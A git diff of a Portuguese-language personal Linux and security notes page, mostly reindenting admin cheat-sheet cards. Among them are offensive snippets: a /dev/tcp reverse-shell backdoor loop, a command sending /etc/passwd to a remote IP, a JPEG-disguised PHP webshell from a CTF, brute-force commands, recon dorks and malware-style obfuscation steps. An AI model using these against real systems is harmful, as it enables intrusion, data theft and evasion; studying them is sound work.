@@ -121,6 +121,7 @@
                 <h3>OpenCTI</h3>
                 <button onclick="showModalIncluse('opencti')">Ver Detalhes</button>
             </div>
+            <br>
     </section>
     <br>
 
@@ -148,529 +149,531 @@
                 <h3>Firewall</h3>
                 <button onclick="showModalPlaybook('firewalld')">Ver Detalhes</button>
             </div>
-
+            <br>
     </section>
     <br>
 
     <!-- notes -->
-    z<section id="commands" class="container">
+    <section id="commands" class="container">
         <h2>Comandos & Anotações</h2>
         <br>
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Comandos Úteis</h1>
-                <p><strong>Consultar comandos - </strong><a href="https://explainshell.com/"
-                        target="_blank">https://explainshell.com/</a></p>
-                <p><strong>Remover KeySensitive - </strong>echo set completion-ignore-case on | sudo tee -a
-                    /etc/inputrc
-                </p>
-                <p><strong>Uso de disco - </strong>df -h</p>
-                <p><strong>Uso de memória - </strong>free -m</p>
-                <p><strong>Uso de CPU - </strong>top</p>
-                <p><strong>Verificar processos - </strong>ps axjf</p>
-                <p><strong>Verificar versão do Kernel - </strong>uname -a</p>
-                <p><strong>Verificar versão do SO - </strong>cat /etc/*-release</p>
-                <p><strong>Listar comandos disponiveis - </strong>apropos ''</p>
-                <p><strong>Listar todos os comandos disponíveis - </strong>compgen -c</p>
-                <p><strong>Listar todos os aliases disponíveis - </strong>compgen -a</p>
-                <p><strong>Listar "arquivos" abertos - </strong>lsof</p>
-                <p><strong>Rastrear Chamadas do Sistema - </strong>strace</p>
-                <p><strong>Rastrear Chamadas de Bibliotecas - </strong>ltrace</p>
-                <p><strong>Listar dispositivos USB por ID - </strong>ls -l /dev/disk/by-id/</p>
-                <p><strong>Informações detalhadas de USB - </strong>sudo lsusb -v -s 001:005</p>
-                <p><strong>Informações detalhadas por Blocos - </strong>udevadm info --query=all --name=/dev/sda
-                    | grep
-                    SERIAL</p>
-            </div>
-
-            <div class="note-card2">
-                <h1>Sites Úteis</h1>
-                <p><strong><a href="https://haveibeenpwned.com/" target="_blank">Have I Been Pwned</a></strong> -
-                    Verifica se seus dados foram comprometidos em vazamentos.</p>
-            </div>
-
-            <div class="note-card2">
-                <h1>Ferramentas de CTI</h1>
-                <p><strong><a href="https://dev.urlquery.net" target="_blank">URLQuery</a></strong> - Análise de URLs.
-                </p>
-                <p><strong><a href="https://urlscan.io" target="_blank">URLScan</a></strong> - Escaneamento de URLs.
-                    </li>
-                <p><strong><a href="https://www.virustotal.com" target="_blank">VirusTotal</a></strong> - Análise de
-                    arquivos e URLs.</p>
-                <p><strong><a href="https://www.urlvoid.com/" target="_blank">URLVoid</a></strong> - Verificação de
-                    reputação de URLs.</p>
-                <p><strong><a href="https://sitecheck.sucuri.net/" target="_blank">Sucuri SiteCheck</a></strong> -
-                    Verificação de segurança de sites.</p>
-            </div>
-
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Criação de usuário</h1>
-                <p><strong>Adicionar usuário com restrições:</strong></p>
-                <p>sudo useradd --badname -m -s /bin/rbash usuario</p>
-                <p>sudo passwd usuario</p>
-                <br>
-                <p><strong>Para alterar o SHELL:</strong></p>
-                <p>sudo usermod --shell /bin/bash usuario</p>
-                <br>
-                <p><strong>Criar usuário sem Home</strong></p>
-                <p>sudo adduser --system --no-create-home --group nome_do_usuario</p>
-            </div>
-
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Python3</h1>
-                <p><strong>Remover restrição do PIP INSTALL - </strong>sudo rm
-                    /usr/lib/python3.11/EXTERNALLY-MANAGED
-                </p>
-            </div>
-
-            <div class="note-card2">
-                <h1>Configuração de Teclado</h1>
-                <p><strong>Alterar layout do teclado para US:</strong></p>
-                <p>setxkbmap us</p>
-                <p><strong>Alterar layout do teclado para BR:</strong></p>
-                <p>setxkbmap br</p>
-                <p><strong>Verificar layout atual do teclado:</strong></p>
-                <p>setxkbmap -query</p>
-                <p><strong>Definir layout persistente (adicionar ao arquivo .bashrc):</strong></p>
-                <p>echo "setxkbmap us" >> ~/.bashrc</p>
-            </div>
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Python Env 2.7 e 3.x</h1>
-                <p>mkdir novo_projeto && cd novo_projeto</p>
-                <p><strong>Python2.7 - </strong>python2.7 -m virtualenv venv</p>
-                <p><strong>Python3.x - </strong>python3 -m venv venv</p>
-                <p><strong>Habilitar o Env - </strong>source venv/bin/activate</p>
-                <p><strong>Desabilitar o Env - </strong>deactivate</p>
-                <p><strong>Instalar Libs - </strong>pip install -r requirements.txt</p>
-                <p><strong>Exportar Libs - </strong>pip freeze > requirements.txt</p>
-            </div>
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Criar e Restaurar Backups</h1>
-                <p><strong>BKP de diretório - </strong>sudo tar -cvpzf /caminho/para/backup_home.tar.gz -C /home
-                </p>
-                <p><strong>Restaurar BKP - </strong>sudo tar -cvpzf /caminho/para/backup_home.tar.gz -C
-                    /home/seu_usuario</p>
-            </div>
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Configuração de Rede</h1>
-                <p><strong>Verificar Interfaces/IPs - </strong>ip -br a</p>
-                <p><strong>"Subir" interface de rede - </strong>sudo ip link set eth0 up</p>
-                <p><strong>"Derrubar" interface de rede - </strong>sudo ip link set eth0 down</p>
-                <p><strong>Renomear interface de rede - </strong>sudo ip link set eth0 name eth1</p>
-                <p><strong>Verificar endereço IP da interface - </strong>ip addr show eth0</p>
-                <p><strong>Configurar endereço IP estático - </strong>sudo ip addr add 192.168.1.100/24 dev eth0</p>
-                <p><strong>Remover endereço IP - </strong>sudo ip addr del 192.168.1.100/24 dev eth0</p>
-                <p><strong>Adicionar rota padrão - </strong>sudo ip route add default via 192.168.1.1</p>
-                <p><strong>Verificar tabela de roteamento - </strong>ip route show</p>
-                <p><strong>Testar conectividade (ping) - </strong>ping google.com</p>
-                <p><strong>Liberar e renovar IP (DHCP) - </strong>sudo dhclient -r eth0 && sudo dhclient eth0</p>
-                <p><strong>Verificar status da interface - </strong>ip link show eth0</p>
-                <p><strong>Habilitar/Desabilitar IPv6 - </strong>sudo sysctl -w net.ipv6.conf.eth0.disable_ipv6=1</p>
-                <p><strong>Verificar tráfego de rede - </strong>sudo iftop -i eth0</p>
-                <p><strong>Configurar DNS temporário - </strong>sudo echo "nameserver 8.8.8.8" > /etc/resolv.conf</p>
-                <p><strong>Verificar resolução DNS - </strong>nslookup google.com</p>
-                <p><strong>Verificar velocidade da interface - </strong>ethtool eth0</p>
-                <p><strong>Configurar MTU da interface - </strong>sudo ip link set eth0 mtu 1500</p>
-                <p><strong>Monitorar tráfego de rede em tempo real - </strong>sudo tcpdump -i eth0</p>
-                <p><strong>Observar conexões ativas - </strong>ss -tulnp</p>
-                <br>
-                <p><strong>Descoberta de Rede (ARP) - </strong>sudo netdiscover</p>
-                <p><strong>PingSweep</strong> - (for ip in 192.168.1.{1..254}; do (ping -c 1 -W 1 $ip > /dev/null 2>&1
-                    && echo "$ip está ativo") & done; wait) 2>/dev/null</p>
-                <p><strong>PortScanner</strong> - (for port in {1..65535}; do (echo > /dev/tcp/<IP_ALVO>/$port)
-                        2>/dev/null && echo "Porta $port aberta" & done; wait) 2>/dev/null</p>
-                <p><strong>Verificar Tabela Arp - - </strong>cat /proc/net/arp</p>
-
-
-            </div>
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Recriar GRUB</h1>
-                <p><strong>GRUB:</strong></p>
-                <p>grub> set root=(hd0,1) &lt;&lt;- sintaxe da versão Grub2</p>
-                <p>grub> linux /boot/vmlinuz-xxxx root=/dev/sda1 ro quiet</p>
-                <p>grub> initrd /boot/initrd.img</p>
-                <p>grub> boot</p>
-                <p><strong>CFG:</strong></p>
-                <p>sudo nano /etc/default/grub</p>
-                <p><strong>Manual em:</strong> <a href="https://www.gnu.org/software/grub"
-                        target="_blank">www.gnu.org/software/grub</a></p>
-            </div>
-
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Manipulação de Serviços</h1>
-                <p><strong>Listar Serviços - </strong>sudo systemctl list-unit-files</p>
-                <p><strong>Habilitar Serviço - </strong>sudo systemctl enable (nome do serviço)</p>
-                <p><strong>Desabilitar Serviço - </strong>sudo systemctl disable (nome do serviço)</p>
-                <p><strong>Status do Serviço - </strong>sudo systemctl status (nome do serviço)</p>
-                <p><strong>Iniciar Serviço - </strong>sudo systemctl start (nome do serviço)</p>
-                <p><strong>Parar Serviço - </strong>sudo systemctl stop (nome do serviço)</p>
-                <p><strong>Reiniciar Serviço - </strong>sudo systemctl restart (nome do serviço)</p>
-                <p><strong>Recarregar Serviços - </strong>sudo systemctl daemon-reload</p>
-                <p><strong>Diretórios comuns dos Serviços - </strong>/lib, /etc e /run : /systemd/system/</p>
-            </div>
-
-
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Firewall Commands</h1>
-                <p><strong>Redirecionar saída para destino específico:</strong></p>
-                <p>sudo iptables -t nat -A OUTPUT -o tun0 -j DNAT --to-destination 10.13.5.224</p>
-                <p><strong>Alterar a interface de uma zona:</strong></p>
-                <p>firewall-cmd --zone={selected_zone} --change-interface={seleciona_interface} --permanent</p>
-                <p><strong>Adicionar interfaces a uma zona:</strong></p>
-                <p>firewall-cmd --zone={selected_zone} --permanent --add-interface={seleciona_interface}</p>
-                <p><strong>Remover interfaces de uma zona:</strong></p>
-                <p>firewall-cmd --zone={selected_zone} --permanent --remove-interface={interface_to_remove}</p>
-                <p><strong>Adicionar serviços a uma zona:</strong></p>
-                <p>firewall-cmd --add-service={service_choice} --permanent --zone={selected_zone}</p>
-                <p><strong>Remover serviços de uma zona:</strong></p>
-                <p>firewall-cmd --remove-service={service_choice} --permanent --zone={selected_zone}</p>
-                <p><strong>Adicionar portas a uma zona:</strong></p>
-                <p>firewall-cmd --add-port={port}/tcp --permanent --zone={selected_zone}</p>
-                <p>firewall-cmd --add-port={port}/udp --permanent --zone={selected_zone}</p>
-                <p><strong>Remover portas de uma zona:</strong></p>
-                <p>firewall-cmd --remove-port={port}/tcp --permanent --zone={selected_zone}</p>
-                <p>firewall-cmd --remove-port={port}/udp --permanent --zone={selected_zone}</p>
-                <p><strong>Bloquear IP:</strong></p>
-                <p>firewall-cmd --permanent --zone={selected_zone} --add-rich-rule='rule family=ipv4 source
-                    address={blocked_ip} drop'</p>
-                <p><strong>Bloquear range de IP por máscara (não testado):</strong></p>
-                <p>firewall-cmd --permanent --zone={selected_zone} --add-rich-rule='rule family=ipv4 source
-                    address={ip_mask} drop'</p>
-                <p><strong>Alterar o target:</strong></p>
-                <p>firewall-cmd --zone=selected_zone --set-target=sit-target</p>
-                <p><strong>Aplicar configurações:</strong></p>
-                <p>firewall-cmd --reload</p>
-                <br>
-                <h1>Redirecionar Portas com Firewalld</h1>
-                <p><strong>Adicionar redirecionamento de porta:</strong></p>
-                <p>firewall-cmd --add-forward-port=port=80:proto=tcp:toport=3000</p>
-                <p>firewall-cmd --runtime-to-permanent</p>
-                <p><strong>Remover redirecionamento de porta:</strong></p>
-                <p>firewall-cmd --remove-forward-port=port=80:proto=tcp:toport=3000:toaddr=</p>
-                <p>firewall-cmd --runtime-to-permanent</p>
-            </div>
-
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Baixar Sites</h1>
-                <p><strong>Com WGET (SinglePage) - </strong>wget --mirror --convert-links --adjust-extension
-                    --page-requisites https://URL</p>
-                <p><strong>Com WGET (FullPage) - </strong>wget -e robots=off -mpEk --span-hosts --no-parent --domains
-                    bootstrapmade.com https://URL</p>
-                <p><strong>Com CURL - </strong>curl -O https://URL</p>
-                <p><strong>Com /dev/tcp - </strong>exec 3<> /dev/tcp/IP_REMOTO/PORTA ;echo -e "GET / HTTP/1.1\r\nHost:
-                        IP_REMOTO\r\nConnection: close\r\n\r\n" >&3; cat <&3> NOME_ARQUIVO</p>
-            </div>
-
-            <div class="note-card2">
-                <h1>Fuzzing</h1>
-                <p><strong>Fuzzing diretórios:</strong></p>
-                <p><code>ffuf -u http://target.com/FUZZ -w wordlist.txt</code></p>
-                <p><strong>Fuzzing subdomínios:</strong></p>
-                <p><code>ffuf -u https://FUZZ.victim.com -w wordlist.txt</code></p>
-            </div>
-
-            <div class="note-card2">
-                <h1>Brute Force</h1>
-                <p><strong>Hydra - Ataque de força bruta em SSH:</strong></p>
-                <p><code>hydra -l usuario -P /caminho/para/wordlist.txt ssh://IP_ALVO</code></p>
-                <p><strong>Hydra - Ataque de força bruta em HTTP:</strong></p>
-                <p><code>hydra -l usuario -P /caminho/para/wordlist.txt IP_ALVO http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"</code>
-                </p>
-                <p><strong>Medusa - Ataque de força bruta em FTP:</strong></p>
-                <p><code>medusa -h IP_ALVO -u usuario -P /caminho/para/wordlist.txt -M ftp</code></p>
-                <p><strong>John The Ripper - Força bruta em hashes:</strong></p>
-                <p><code>john --wordlist=/caminho/para/wordlist.txt hash.txt</code></p>
-                <p><strong>Hashcat - Força bruta em hashes:</strong></p>
-                <p><code>hashcat -m 0 -a 0 hash.txt /caminho/para/wordlist.txt</code></p>
-                <p><strong>WFuzz - Força bruta em parâmetros de URL:</strong></p>
-                <p><code>wfuzz -c -z file,/caminho/para/wordlist.txt --hc 404 http://IP_ALVO/FUZZ</code></p>
-
-            </div>
-
-
-            <div class="note-card2">
-                <h1>Ordenação de Arquivos</h1>
-                <p><strong>Ordenar arquivo em ordem crescente:</strong></p>
-                <p>cat arquivo.txt | sort</p>
-                <p><strong>Ordenar arquivo em ordem decrescente:</strong></p>
-                <p>cat arquivo.txt | sort -r</p>
-                <p><strong>Exibir arquivo em ordem crescente com números:</strong></p>
-                <p>sort -n arquivo.txt</p>
-                <p><strong>Exibir arquivo em ordem decrescente com números:</strong></p>
-                <p>sort -nr arquivo.txt</p>
-                <br>
-                <p><strong>Exibir conteúdo do arquivo:</strong></p>
-                <p>cat arquivo.txt</p>
-                <p><strong>Exibir conteúdo do arquivo em ordem inversa:</strong></p>
-                <p>tac arquivo.txt</p>
-
-            </div>
-
-            <div class="note-card2">
-                <h1>Persistência (Shell)</h1>
-                <p><strong>Shell Backdoor com While True:</strong></p>
-                <p><code>while true; do exec 3<>/dev/tcp/127.0.0.1/4545; /bin/sh 0<&3 1>&3 2>&3; sleep 5; done</p></code>
-            </div>
-
-            <div class="note-card2">
-                <h1>Exfiltrar Arquivos (Shell)</h1>
-                <p><strong>Shell Backdoor com While True:</strong></p>
-                <p><code>exec 3<>/dev/tcp/192.168.0.10/4545; cat /etc/passwd >&3; exec 3<&-; exec 3>&-</p></code>
-            </div>
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Dados de Conexão</h1>
-                <p><strong>IP Externo - </strong>curl ifconfig.me</p>
-            </div>
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>PHP</h1>
-                <p><strong>Camuflar WebShellPHP em Imagem:</strong></p>
-                <p>echo -e "\xFF\xD8\xFF\xE0" > image.php</p>
-                <p>echo -n '&lt;?php $p = file_get_contents("/etc/natas_webpass/natas14"); echo $p; ?&gt;' >>
-                    image.php
-                </p>
-                <p><strong>Verificar o arquivo</strong></p>
-                <p>file image.php</p>
-                <p><strong>Deve retornar o seguinte:</strong></p>
-                <p>image.php: JPEG image data</p>
-            </div>
-
-
-
-            <div class="note-card2">
-                <h1>Google Dorks</h1>
-                <p><strong>Finding exposed directories:</strong></p>
-                <p><code>intitle:"Index of" -inurl:(jsp|pl|php|html|aspx|htm|cf|shtml) </code></p>
-                <p><code>-inurl:(listen77|mp3raid|mp3toss|mp3drug|index_of|wallywashis)</code></p>
-                <p><strong>Discovering open webcams:</strong></p>
-                <p><code>inurl:"viewerframe?mode=motion"</code></p>
-
-                <p><strong>Finding email lists:</strong></p>
-                <p><code>filetype:txt @gmail.com OR @yahoo.com OR @hotmail.com OR @aol.com</code></p>
-
-                <p><strong>Uncovering vulnerable web servers:</strong></p>
-                <p><code>intitle:"Welcome to Windows 2000 Internet Services"</code></p>
-
-                <p><strong>Discovering exposed CCTV cameras:</strong></p>
-                <p><code>inurl:ViewerFrame?Mode=Motion</code></p>
-
-                <p><strong>Finding SQL injection vulnerabilities:</strong></p>
-                <p><code>inurl:index.php?id=</code></p>
-
-                <p><strong>Uncovering sensitive information in files:</strong></p>
-                <p><code>intitle:"Index of" password.txt</code></p>
-
-                <p><strong>Discovering login pages:</strong></p>
-                <p><code>inurl:admin/login</code></p>
-
-                <p><strong>Finding exposed databases:</strong></p>
-                <p><code>intext:"phpMyAdmin" "running on" inurl:"main.php"</code></p>
-
-                <p><strong>Discovering vulnerable WordPress sites:</strong></p>
-                <p><code>inurl:/wp-content/plugins/revslider/</code></p>
-
-                <p><strong>Finding open FTP servers:</strong></p>
-                <p><code>intitle:"index of" inurl:ftp</code></p>
-
-                <p><strong>Discovering exposed configuration files:</strong></p>
-                <p><code>intitle:"index of" config.yml</code></p>
-
-                <p><strong>Finding open Git repositories:</strong></p>
-                <p><code>intitle:index of .git</code></p>
-
-                <p><strong>Discovering vulnerable Joomla installations:</strong></p>
-                <p><code>inurl:/index.php?option=com_joomla</code></p>
-
-                <p><strong>Finding sensitive files:</strong></p>
-                <p><code>intitle:"index of" password OR passcode OR passphrase OR keyfile</code></p>
-
-                <p><strong>Discovering exposed MongoDB instances:</strong></p>
-                <p><code>intitle:"mongodb status" intext:"topologyVersion"</code></p>
-
-                <p><strong>Finding open network devices:</strong></p>
-                <p><code>intitle:"open network devices"</code></p>
-
-                <p><strong>Discovering exposed subdomains:</strong></p>
-                <p><code>site:\*.example.com -www</code></p>
-
-                <p><strong>Finding vulnerable Apache Tomcat installations:</strong></p>
-                <p><code>intitle:"Apache Tomcat" intext:"If you're seeing this, you've successfully installed Tomcat"</code>
-                </p>
-
-                <p><strong>Discovering exposed GitLab repositories:</strong></p>
-                <p><code>intitle:"GitLab"</code></p>
-
-                <p><strong>Finding exposed server directories:</strong></p>
-                <p><code>intitle:"index of" /admin</code></p>
-
-                <p><strong>Discovering sensitive Google Drive files:</strong></p>
-                <p><code>site:drive.google.com confidential</code></p>
-
-                <p><strong>Finding exposed Jenkins instances:</strong></p>
-                <p><code>intitle:"Dashboard [Jenkins]"</code></p>
-
-                <p><strong>Discovering exposed AWS S3 buckets:</strong></p>
-                <p><code>site:s3.amazonaws.com</code></p>
-
-                <p><strong>Finding vulnerable Magento installations:</strong></p>
-                <p><code>inurl:/index.php/admin</code></p>
-
-                <p><strong>Discovering exposed log files:</strong></p>
-                <p><code>intitle:"index of" error.log</code></p>
-
-                <p><strong>Finding open Elasticsearch instances:</strong></p>
-                <p><code>intitle:"Kibana" intext:"Welcome to Elastic"</code></p>
-
-                <p><strong>Discovering exposed API keys:</strong></p>
-                <p><code>filetype:env intext:API_KEY</code></p>
-
-                <p><strong>Finding exposed phpMyAdmin installations:</strong></p>
-                <p><code>inurl:"phpmyadmin/index.php"</code></p>
-
-                <p><strong>Discovering vulnerable OpenCart installations:</strong></p>
-                <p><code>inurl:/admin/config.php</code></p>
-
-                <p><strong>Finding exposed sensitive documents:</strong></p>
-                <p><code>filetype:pdf "Confidential"</code></p>
-
-                <p><strong>Discovering exposed network devices:</strong></p>
-                <p><code>intitle:"Device name" inurl:home.htm</code></p>
-
-                <p><strong>Finding open RDP (Remote Desktop Protocol) servers:</strong></p>
-                <p><code>intitle:"Remote Desktop Web Connection"</code></p>
-
-                <p><strong>Discovering exposed Firebase databases:</strong></p>
-                <p><code>intitle:"Firebase Console - Projects"</code></p>
-
-                <p><strong>Finding vulnerable Drupal installations:</strong></p>
-                <p><code>inurl:"/user/login" "Powered by Drupal"</code></p>
-            </div>
-
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Enumeração</h1>
-                <p><strong>LinPeas - </strong>curl -L
-                    https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash</p>
-            </div>
-
-            <div class="note-card2">
-                <h1>Docker Commands</h1>
-                <p><strong>Listar containers em execução:</strong> docker ps</p>
-                <p><strong>Listar todos containers (inclusive parados):</strong> docker ps -a</p>
-                <p><strong>Iniciar container parado:</strong> docker start &lt;container_id/nome&gt;</p>
-                <p><strong>Parar container rodando:</strong> docker stop &lt;container_id/nome&gt;</p>
-                <p><strong>Reiniciar container:</strong> docker restart &lt;container_id/nome&gt;</p>
-                <p><strong>Remover container:</strong> docker rm &lt;container_id/nome&gt;</p>
-                <p><strong>Remover todos containers parados:</strong> docker container prune</p>
-                <br>
-                <p><strong>Listar imagens locais:</strong> docker images ou docker image ls</p>
-                <p><strong>Baixar imagem do Docker Hub:</strong> docker pull &lt;imagem&gt;:&lt;tag&gt;</p>
-                <p><strong>Enviar imagem para o Docker Hub:</strong> docker push &lt;imagem&gt;:&lt;tag&gt;</p>
-                <p><strong>Remover imagem específica:</strong> docker rmi &lt;imagem&gt;:&lt;tag&gt;</p>
-                <p><strong>Remover todas imagens sem container associado:</strong> docker image prune</p>
-                <p><strong>Remover todas imagens do host:</strong> docker rmi $(docker images -q)</p>
-                <br>
-                <p><strong>Listar redes:</strong> docker network ls</p>
-                <p><strong>Criar nova rede:</strong> docker network create &lt;nome_rede&gt;</p>
-                <p><strong>Inspecionar rede:</strong> docker network inspect &lt;nome_rede&gt;</p>
-                <p><strong>Remover rede:</strong> docker network rm &lt;nome_rede&gt;</p>
-                <br>
-                <p><strong>Ver logs do container:</strong> docker logs &lt;container_id/nome&gt;</p>
-                <p><strong>Executar comando dentro do container:</strong> docker exec -it &lt;container_id/nome&gt;
-                    /bin/bash</p>
-                <p><strong>Build de imagem via Dockerfile:</strong> docker build -t &lt;nome_imagem&gt;:&lt;tag&gt; .
-                </p>
-                <p><strong>Parar todos os containers:</strong> docker stop $(docker ps -q)</p>
-                <p><strong>Remover todos os containers:</strong> docker rm $(docker ps -aq)</p>
-                <p><strong>Limpar tudo (containers, imagens, volumes e redes não usadas):</strong> docker system prune
-                    -a
-                </p>
-            </div>
-
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Estabilizar Conexão</h1>
-                <p><strong>Reverse Shell - </strong> <a href="https://www.revshells.com/"
-                        target="_blank">https://www.revshells.com/</a></p>
-            </div>
-
-
-            <div class="note-card2">
-                <h1>SED</h1>
-                <p><strong>Substituir primeira ocorrência:</strong></p>
-                <p><code>sed 's/old_word/new_word/' arquivo.txt</code></p>
-                <p>Substitui apenas a primeira ocorrência de <code>old_word</code> por <code>new_word</code> em cada linha.</p>
-                <br>
-                <p><strong>Substituir todas ocorrências (global):</strong></p>
-                <p><code>sed 's/old_word/new_word/g' arquivo.txt</code></p>
-                <p>Substitui todas as ocorrências de <code>old_word</code> por <code>new_word</code> em cada linha.</p>
-                <br>
-                <p><strong>Substituir a n-ésima ocorrência:</strong></p>
-                <p><code>sed 's/old_word/new_word/3' arquivo.txt</code></p>
-                <p>Altera apenas a terceira ocorrência de <code>old_word</code> para <code>new_word</code> em cada
-                    linha.</p>
-                <br>
-                <p><strong>Deletar linhas em branco:</strong></p>
-                <p><code>sed '/^$/d' arquivo.txt</code></p>
-                <p>Remove todas as linhas vazias do arquivo.</p>
-                <br>
-                <p><strong>Inserir texto antes da linha correspondente:</strong></p>
-                <p><code>sed '/pattern/i\Texto a inserir' arquivo.txt</code></p>
-                <p>Insere “Texto a inserir” antes de cada linha que contenha <code>pattern</code>.</p>
-                <br>
-                <p><strong>Apender texto após a linha correspondente:</strong></p>
-                <p><code>sed '/pattern/a\Texto a apendar' arquivo.txt</code></p>
-                <p>Apende “Texto a apendar” após cada linha que contenha <code>pattern</code>.</p>
-                <br>
-                <p><strong>Numeração simples de linhas:</strong></p>
-                <p><code>sed = arquivo.txt | sed 'N;s/\n/\t/'</code></p>
-                <p>Numera cada linha, alinhando o número à esquerda com uma tabulação.</p>
-                <br>
-                <p><strong>Mostrar apenas linhas de 5 a 10:</strong></p>
-                <p><code>sed -n '5,10p' arquivo.txt</code></p>
-                <p>Imprime apenas as linhas de 5 a 10 do arquivo.</p>
-                <br>
-                <p><strong>Edição in-place com backup:</strong></p>
-                <p><code>sed -i.bak 's/old/new/g' arquivo.txt</code></p>
-                <p>Substitui globalmente <code>old</code> por <code>new</code> diretamente em <code>arquivo.txt</code>,
-                    salvando o original em <code>arquivo.txt.bak</code>.</p>
-                <br>
-                <p><strong>Usar expressões regulares estendidas:</strong></p>
-                <p><code>sed -E 's/[[:space:]]+/ /g' arquivo.txt</code></p>
-                <p>Substitui múltiplos espaços em branco por um único espaço, usando regex estendida.</p>
-            </div>
-
-            <!-- note 1 -->
-            <div class="note-card2">
-                <h1>Ofuscação</h1>
-                <p><strong>PyArmor - </strong>pyarmor -q gen gunkey.py</p>
-                <p><strong>PyInstaller - </strong>pyinstaller -n Firefox -F gunkey.py</p>
-                <p><strong>PyArmor with Obfuscation - </strong>pyarmor gen -O obfdist --pack dist/Firefox
-                    gunkey.py</p>
-            </div>
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Comandos Úteis</h1>
+            <p><strong>Consultar comandos - </strong><a href="https://explainshell.com/"
+                    target="_blank">https://explainshell.com/</a></p>
+            <p><strong>Remover KeySensitive - </strong>echo set completion-ignore-case on | sudo tee -a
+                /etc/inputrc
+            </p>
+            <p><strong>Uso de disco - </strong>df -h</p>
+            <p><strong>Uso de memória - </strong>free -m</p>
+            <p><strong>Uso de CPU - </strong>top</p>
+            <p><strong>Verificar processos - </strong>ps axjf</p>
+            <p><strong>Verificar versão do Kernel - </strong>uname -a</p>
+            <p><strong>Verificar versão do SO - </strong>cat /etc/*-release</p>
+            <p><strong>Listar comandos disponiveis - </strong>apropos ''</p>
+            <p><strong>Listar todos os comandos disponíveis - </strong>compgen -c</p>
+            <p><strong>Listar todos os aliases disponíveis - </strong>compgen -a</p>
+            <p><strong>Listar "arquivos" abertos - </strong>lsof</p>
+            <p><strong>Rastrear Chamadas do Sistema - </strong>strace</p>
+            <p><strong>Rastrear Chamadas de Bibliotecas - </strong>ltrace</p>
+            <p><strong>Listar dispositivos USB por ID - </strong>ls -l /dev/disk/by-id/</p>
+            <p><strong>Informações detalhadas de USB - </strong>sudo lsusb -v -s 001:005</p>
+            <p><strong>Informações detalhadas por Blocos - </strong>udevadm info --query=all --name=/dev/sda
+                | grep
+                SERIAL</p>
+        </div>
+
+        <div class="note-card2">
+            <h1>Sites Úteis</h1>
+            <p><strong><a href="https://haveibeenpwned.com/" target="_blank">Have I Been Pwned</a></strong> -
+                Verifica se seus dados foram comprometidos em vazamentos.</p>
+        </div>
+
+        <div class="note-card2">
+            <h1>Ferramentas de CTI</h1>
+            <p><strong><a href="https://dev.urlquery.net" target="_blank">URLQuery</a></strong> - Análise de URLs.
+            </p>
+            <p><strong><a href="https://urlscan.io" target="_blank">URLScan</a></strong> - Escaneamento de URLs.
+                </li>
+            <p><strong><a href="https://www.virustotal.com" target="_blank">VirusTotal</a></strong> - Análise de
+                arquivos e URLs.</p>
+            <p><strong><a href="https://www.urlvoid.com/" target="_blank">URLVoid</a></strong> - Verificação de
+                reputação de URLs.</p>
+            <p><strong><a href="https://sitecheck.sucuri.net/" target="_blank">Sucuri SiteCheck</a></strong> -
+                Verificação de segurança de sites.</p>
+        </div>
+
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Criação de usuário</h1>
+            <p><strong>Adicionar usuário com restrições:</strong></p>
+            <p>sudo useradd --badname -m -s /bin/rbash usuario</p>
+            <p>sudo passwd usuario</p>
+            <br>
+            <p><strong>Para alterar o SHELL:</strong></p>
+            <p>sudo usermod --shell /bin/bash usuario</p>
+            <br>
+            <p><strong>Criar usuário sem Home</strong></p>
+            <p>sudo adduser --system --no-create-home --group nome_do_usuario</p>
+        </div>
+
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Python3</h1>
+            <p><strong>Remover restrição do PIP INSTALL - </strong>sudo rm
+                /usr/lib/python3.11/EXTERNALLY-MANAGED
+            </p>
+        </div>
+
+        <div class="note-card2">
+            <h1>Configuração de Teclado</h1>
+            <p><strong>Alterar layout do teclado para US:</strong></p>
+            <p>setxkbmap us</p>
+            <p><strong>Alterar layout do teclado para BR:</strong></p>
+            <p>setxkbmap br</p>
+            <p><strong>Verificar layout atual do teclado:</strong></p>
+            <p>setxkbmap -query</p>
+            <p><strong>Definir layout persistente (adicionar ao arquivo .bashrc):</strong></p>
+            <p>echo "setxkbmap us" >> ~/.bashrc</p>
+        </div>
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Python Env 2.7 e 3.x</h1>
+            <p>mkdir novo_projeto && cd novo_projeto</p>
+            <p><strong>Python2.7 - </strong>python2.7 -m virtualenv venv</p>
+            <p><strong>Python3.x - </strong>python3 -m venv venv</p>
+            <p><strong>Habilitar o Env - </strong>source venv/bin/activate</p>
+            <p><strong>Desabilitar o Env - </strong>deactivate</p>
+            <p><strong>Instalar Libs - </strong>pip install -r requirements.txt</p>
+            <p><strong>Exportar Libs - </strong>pip freeze > requirements.txt</p>
+        </div>
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Criar e Restaurar Backups</h1>
+            <p><strong>BKP de diretório - </strong>sudo tar -cvpzf /caminho/para/backup_home.tar.gz -C /home
+            </p>
+            <p><strong>Restaurar BKP - </strong>sudo tar -cvpzf /caminho/para/backup_home.tar.gz -C
+                /home/seu_usuario</p>
+        </div>
+
+        <!-- note 1 -->
+        <div class="note-card2">
+            <h1>Configuração de Rede</h1>
+            <p><strong>Verificar Interfaces/IPs - </strong>ip -br a</p>
+            <p><strong>"Subir" interface de rede - </strong>sudo ip link set eth0 up</p>
+            <p><strong>"Derrubar" interface de rede - </strong>sudo ip link set eth0 down</p>
